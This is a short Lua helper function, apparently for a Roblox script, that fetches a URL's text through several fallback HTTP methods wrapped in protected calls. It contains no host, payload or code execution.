local function _safeGet(url)
	if type(url)~="string"then return nil end
	if type(game.HttpGet)=="function"then
		local _ok,_res=_pcall(function()return game:HttpGet(url)end)
		if _ok and type(_res)=="string"and _res~=""then return _res end
	end
	if HttpService and type(HttpService.GetAsync)=="function"then
		local _ok,_res=_pcall(function()return HttpService:GetAsync(url,false)end)
		if _ok and type(_res)=="string"and _res~=""then return _res end
	end
	local _resp=_requestCall({Url=url,Method="GET"})
	if _resp then return _resp.Body or _resp.body end
	return nil
end

